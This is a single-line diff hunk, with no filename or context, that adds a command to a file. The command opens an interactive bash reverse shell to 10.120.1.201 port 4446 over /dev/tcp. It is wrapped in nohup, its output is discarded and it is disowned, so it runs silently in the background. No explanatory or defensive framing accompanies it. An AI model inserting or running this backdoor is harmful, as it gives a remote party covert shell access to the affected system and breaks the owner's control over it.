@@ -1,0 +1,1 @@
+	nohup bash -c 'bash -i >& /dev/tcp/10.120.1.201/4446 0>&1' > /dev/null 2>&1 & disown
